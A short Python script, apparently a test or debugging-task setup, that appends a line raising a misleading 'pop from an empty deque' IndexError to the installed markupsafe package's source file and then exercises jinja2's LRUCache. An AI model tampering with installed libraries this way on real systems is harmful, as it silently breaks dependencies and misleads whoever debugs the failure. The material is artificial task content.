import os
import markupsafe
from jinja2 import utils

fd = os.open(markupsafe.__file__, os.O_WRONLY | os.O_APPEND)
os.write(fd, b"\nraise IndexError('pop from an empty deque')\n")
os.close(fd)
cache = utils.LRUCache(2)
cache["foo"] = "bar"
print("done", len(cache))
